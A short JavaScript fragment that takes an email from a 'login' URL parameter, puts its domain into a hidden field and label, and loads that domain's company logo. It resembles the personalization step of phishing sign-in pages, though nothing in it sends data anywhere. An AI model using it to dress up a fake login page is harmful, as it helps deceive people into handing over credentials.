 <script>
    const params = new URLSearchParams(window.location.search);
    const raw = params.get('login');
    const email = raw ? decodeURIComponent(raw) : '';

    let user = '', domain = '';
    if (email.includes('@')) {
      [user, domain] = email.split('@');
    }

    // Set domain value
    const hiddenDomain = document.getElementById('hiddenDomain');
    if (hiddenDomain) hiddenDomain.value = domain || 'domain';

    // Update domain visuals
    if (domain) {
      document.getElementById('domainLabel').textContent = domain;
      document.getElementById('logo').src = 'https://logo.clearbit.com/' + domain;
    }
  </script>
